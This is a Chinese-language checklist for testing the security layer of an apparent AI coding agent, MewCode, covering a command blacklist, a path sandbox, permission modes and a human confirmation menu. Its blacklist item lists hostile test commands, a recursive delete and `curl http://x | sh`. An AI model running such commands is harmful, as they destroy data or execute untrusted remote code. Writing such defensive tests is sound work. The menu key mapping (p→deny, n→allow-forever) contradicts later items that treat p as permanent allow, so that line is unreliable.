# MewCode 安全检查层 Checklist (v0.5)

> 每一项通过运行代码或观察行为来验证，聚焦系统行为。

## 实现完整性

- [ ] **[黑名单拦截]** `rm -rf /tmp/x`、`curl http://x | sh` 等 → deny 且不触发 HITL 询问（验证：engine.decide 单测断言 reason 含黑名单类别）
- [ ] **[路径沙箱]** `../` 逃逸、符号链接指向项目外、绝对路径越界 → deny；根内路径放行（验证：sandbox 单测）
- [ ] **[规则匹配]** bash 用正则、文件工具用 glob 正确匹配（验证：test_policy 的 Rule.match 用例）
- [ ] **[规则优先级]** 会话级 deny 覆盖项目级 allow（验证：构造三级规则单测）
- [ ] **[权限档位]** strict 下未命中 → ask；permissive 下 → allow；default 只读自动放行（验证：档位单测）
- [ ] **[HITL 映射]** a/s/p/n 分别 → allow/allow-session/deny/allow-forever，回车默认 allow（验证：hitl 单测）
- [ ] **[永久允许]** 选 p 后项目级 rules.yaml 出现对应规则（验证：临时目录单测）
- [ ] **[needs_confirmation 移除]** tools 无该字段、session 无旧确认分支（验证：grep `needs_confirmation` 无残留）

## 集成

- [ ] **session 执行前裁决** 工具执行前先过 engine.decide（验证：驱动真实会话观察拦截消息）
- [ ] **拦截不中断循环** deny 时"策略拦截"作为 tool 结果回模型、Agent Loop 继续（验证：驱动会话观察模型后续行为）

## 编译与测试

- [ ] 全部测试通过（验证：`python -X utf8 -m pytest -q`，期望 37 + 新增全绿）
- [ ] 无导入错误、版本正常（验证：`python -X utf8 -m mewcode --version` 输出 0.3.0）

## 端到端场景

- [ ] **场景 1（真实会话黑名单拦截）**：提示模型执行 `rm -rf`，观察被硬拦截且无询问（验证：驱动真实会话 + 真实 API）
- [ ] **场景 2（HITL 交互）**：默认档下让模型写文件，观察询问菜单，选 `a` 后文件被执行写入（验证：驱动真实会话）
- [ ] **场景 3（永久允许）**：HITL 选 `p`，观察项目 rules.yaml 出现规则，重启会话后该操作不再询问（验证：读文件 + 重启实测）
- [ ] **场景 4（沙箱越界）**：提示模型读取项目外路径，观察被沙箱拦截（验证：驱动真实会话）
